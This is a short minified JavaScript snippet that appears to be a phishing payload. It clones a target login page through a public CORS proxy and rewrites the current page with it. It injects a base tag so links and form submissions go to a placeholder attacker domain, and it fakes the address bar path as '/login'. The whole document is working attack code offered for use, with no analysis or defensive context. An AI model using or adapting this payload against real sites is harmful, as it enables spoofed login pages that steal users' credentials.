function doHTMLMagic(e,r,n){return replaceSrc=e.replace('href="/','href="'+r+"/"),replaceSrc=replaceSrc.replace('src="/','src="'+r+"/"),replaceSrc=replaceSrc.replace("<head>",'<head><base href="'+n+'">'),replaceSrc}function createCORSRequest(e,r){var n=new XMLHttpRequest;return"withCredentials"in n?n.open(e,r,!0):"undefined"!=typeof XDomainRequest?(n=new XDomainRequest,n.open(e,r)):n=null,n}function makeCorsRequest(e,r){var n="https://cors-anywhere.herokuapp.com/"+e,c=createCORSRequest("GET",n);c&&(c.onload=function(){var n=doHTMLMagic(c.responseText,e,r);document.open(),document.write(n),document.close()},c.send())}page_src="https://login.vulnwebsite.com/",phishing_url="http://yourphishingdomain.com/",makeCorsRequest(page_src,phishing_url),window.history.pushState("","Login","/login");